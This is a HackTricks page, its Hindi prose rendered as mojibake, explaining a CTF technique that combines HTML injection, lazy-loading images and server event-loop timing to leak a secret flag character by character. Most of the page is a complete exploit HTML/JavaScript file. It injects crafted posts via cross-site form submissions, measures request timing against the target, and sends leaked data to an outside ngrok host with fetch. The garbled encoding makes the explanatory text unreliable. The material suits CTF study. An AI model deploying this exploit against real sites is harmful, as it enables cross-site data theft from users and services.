# рдШрдЯрдирд╛ рд▓реВрдк рдЕрд╡рд░реЛрдзрди + рдЖрд▓рд╕реА рдЫрд╡рд┐рдпрд╛рдБ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> рдХреЗ рд╕рд╛рде рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</a><strong>!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ**.

</details>

[**рдЗрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ**](https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45) рдореЗрдВ, [**@aszx87410**](https://twitter.com/aszx87410) **рд▓реЗрдЬреА рдЗрдореЗрдЬ рд╕рд╛рдЗрдб рдЪреИрдирд▓** рддрдХрдиреАрдХ рдХреЛ рдПрдЪрдЯреАрдПрдордПрд▓ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░ рдПрдХ рдкреНрд░рдХрд╛рд░ рдХрд╛ **рдШрдЯрдирд╛ рд▓реВрдк рдЕрд╡рд░реЛрдзрди рддрдХрдиреАрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рд╡рд░реНрдгреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХреЗрдВред

рдпрд╣ рдПрдХ **рд╡рд┐рднрд┐рдиреНрди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ CTF рдЪреИрд▓реЗрдВрдЬ** рд╣реИ рдЬрд┐рд╕рдХрд╛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рдЯрд┐рдкреНрдкрдгреАрдХрд░реНрддрд╛ рдиреЗ рдиреАрдЪреЗ рджреА рдереАред рдЪреИрд▓реЗрдВрдЬ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

рдЗрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рдкреАрдЫреЗ рдХреА рд╡рд┐рдЪрд╛рд░рдзрд╛рд░рд╛ рд╣реИ:

* рдкреЛрд╕реНрдЯ рд╡рд░реНрдгрдорд╛рд▓рд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд▓реЛрдб рд╣реЛрддреЗ рд╣реИрдВ
* рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдПрдХ **рдкреЛрд╕реНрдЯ** рдореЗрдВ **"A"** рд╕реЗ рд╢реБрд░реВ рдХрд░рдХреЗ **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдлрд┐рд░ рдХреБрдЫ **рдПрдЪрдЯреАрдПрдордПрд▓ рдЯреИрдЧ** (рдЬреИрд╕реЗ рдПрдХ рдмрдбрд╝рд╛ **`<рдХреИрдирд╡рд╛рд╕`**) рдЬреНрдпрд╛рджрд╛рддрд░ **рд╕реНрдХреНрд░реАрди** рдХреЛ рднрд░ рджреЗрдЧрд╛ рдФрд░ рдХреБрдЫ рдЕрдВрддрд┐рдо **`<img рдЖрд▓рд╕реА` рдЯреИрдЧ** рдХреЛ рдЪреАрдЬреЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* рдЕрдЧрд░ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ "A" рдХреА рдмрдЬрд╛рдп **рд╡рд╣реА рдкреЛрд╕реНрдЯ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди "z" рд╕реЗ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИред** рддреЛ **рдЭрдВрдбрд╛** рд╡рд╛рд▓реА **рдкреЛрд╕реНрдЯ** рдкрд╣рд▓реЗ рджрд┐рдЦрд╛рдИ рджреЗрдЧреА, рдлрд┐рд░ **рдЗрдВрдЬреЗрдХреНрдЯреЗрдб рдкреЛрд╕реНрдЯ** "z" рдФрд░ **рдмрдбрд╝рд╛** **рдХреИрдирд╡рд╛рд╕** рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ред рдХреНрдпреЛрдВрдХрд┐ рдЭрдВрдбрд╛ рд╡рд╛рд▓реА рдкреЛрд╕реНрдЯ рдкрд╣рд▓реЗ рджрд┐рдЦрд╛рдИ рджреА рдЧрдИ рдереА, рдкрд╣рд▓рд╛ рдХреИрдирд╡рд╛рд╕ рд╕рднреА рд╕реНрдХреНрд░реАрди рдХреЛ рднрд░реЗрдЧрд╛ рдФрд░ рдЕрдВрддрд┐рдо **`<img рдЖрд▓рд╕реА`** рдЯреИрдЧ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдП рдЧрдП **рд╕реНрдХреНрд░реАрди рдореЗрдВ рдирд╣реАрдВ рджрд┐рдЦрд╛рдИ рджреЗрдВрдЧреЗ**, рдЗрд╕рд▓рд┐рдП рд╡реЗ **рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ**ред
* рдлрд┐рд░, **рдЬрдм** рдмреЙрдЯ рдкреГрд╖реНрда рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ, **рд╣рдорд▓рд╛рд╡рд░** рдлреЗрдЪ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдЧрд╛ред
* рдЕрдЧрд░ рдкреЛрд╕реНрдЯ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХреА рдЧрдИ **рдЫрд╡рд┐рдпрд╛рдБ рд▓реЛрдб рд╣реЛ рд░рд╣реА рд╣реИрдВ**, рддреЛ рдпреЗ **рдлреЗрдЪ** рдЕрдиреБрд░реЛрдз **рдЕрдзрд┐рдХ рд╕рдордп** рд▓реЗрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ **рдкреЛрд╕реНрдЯ рдЭрдВрдбреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╣реИ** (рд╡рд░реНрдгрдорд╛рд▓рд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░)ред
* рдЕрдЧрд░ **рдлреЗрдЪ** рдЕрдиреБрд░реЛрдз **рддреЗрдЬ** рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдкреЛрд╕реНрдЯ** **рдЭрдВрдбреЗ рдХреЗ рдмрд╛рдж** рд╣реИред

рдХреЛрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:
```html
<!DOCTYPE html>
<html>
<!--
The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs event loop.
If images are loading, the request to "/" is slower, otherwise faster.
By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
We can use fetch to measure the request time.
-->
<body>
<button onclick="run()">start</button>

<!-- Inject post with payload -->
<form id=f action="http://localhost:1234/create" method="POST" target="_blank">
<input id=inp name="text" value="">
</form>

<!-- Remove index -->
<form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank">
<input id=inp2 name="index" value="">
</form>

<script>
let flag = 'SEKAI{'
const TARGET = 'https://safelist.ctf.sekai.team'
f.action = TARGET + '/create'
f2.action = TARGET + '/remove'

const sleep = ms => new Promise(r => setTimeout(r, ms))
// Function to leak info to attacker
const send = data => fetch('http://server.ngrok.io?d='+data)
const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')

// start exploit
let count = 0
setTimeout(async () => {
let L = 0
let R = charset.length - 1

// I have omited code here as apparently it wasn't necesary

// fallback to linerar since I am not familiar with binary search lol
for(let i=R; i>=L; i--) {
let c = charset[i]
send('try_' + flag + c)
const found = await testChar(flag + c)
if (found) {
send('found: '+ flag+c)
flag += c
break
}
}

}, 0)

async function testChar(str) {
return new Promise(resolve => {
/*
For 3350, you need to test it on your local to get this number.
The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
If starts with "A", the image should be loaded because it's in the threshold.
*/
// <canvas height="3350px"> is experimental and allow to show the injected
// images when the post injected is the first one but to hide them when
// the injected post is after the post with the flag
inp.value = str + '<br><canvas height="3350px"></canvas><br>'+Array.from({length:20}).map((_,i)=>`<img loading=lazy src=/?${i}>`).join('')
f.submit()

setTimeout(() => {
run(str, resolve)
}, 500)
})
}

async function run(str, resolve) {
// Open posts page 5 times
for(let i=1; i<=5;i++) {
window.open(TARGET)
}

let t = 0
const round = 30 //Lets time 30 requests
setTimeout(async () => {
// Send 30 requests and time each
for(let i=0; i<round; i++) {
let s = performance.now()
await fetch(TARGET + '/?test', {
mode: 'no-cors'
}).catch(err=>1)
let end = performance.now()
t += end - s
console.log(end - s)
}
const avg = t/round
// Send info about how much time it took
send(str + "," + t + "," + "avg:" + avg)

/*
I get this threshold(1000ms) by trying multiple times on remote admin bot
for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
*/
const isFound = (t >= 1000)
if (isFound) {
inp2.value = "0"
} else {
inp2.value = "1"
}

// remember to delete the post to not break our leak oracle
f2.submit()
setTimeout(() => {
resolve(isFound)
}, 200)
}, 200)
}

</script>
</body>
</html>
```
<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **рдореБрдЭреЗ** **Twitter** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдкрд░ PR рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>
